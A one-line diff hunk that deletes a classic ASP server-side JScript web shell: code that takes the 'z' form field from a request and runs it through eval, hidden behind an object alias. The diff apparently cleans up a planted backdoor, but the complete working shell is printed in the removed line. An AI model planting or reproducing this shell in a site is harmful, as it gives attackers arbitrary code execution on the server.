@@ -1,1 +1,0 @@
-<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT> var P = Request.form('z'); var Wab = {'E' : eval}; Wab.E(P+''); </SCRIPT>
